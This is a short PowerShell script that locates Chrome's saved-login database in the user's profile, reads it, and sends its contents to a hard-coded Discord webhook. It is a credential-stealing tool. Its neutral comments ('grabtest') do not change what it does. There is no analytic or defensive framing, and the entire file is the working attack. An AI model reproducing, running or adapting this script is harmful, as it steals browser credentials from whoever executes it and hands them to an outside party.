# Set the path to your file using Join-Path for safety
$filePath = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Check if the file exists
if (-Not (Test-Path $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read the file content
$fileContent = Get-Content -Path $filePath -Raw

# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Prepare the JSON payload to send as message content
$payload = @{
    content = "Contents of grabtest.txt:`n$fileContent"
} | ConvertTo-Json

# Send the POST request to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

Write-Host "File content sent to Discord webhook."
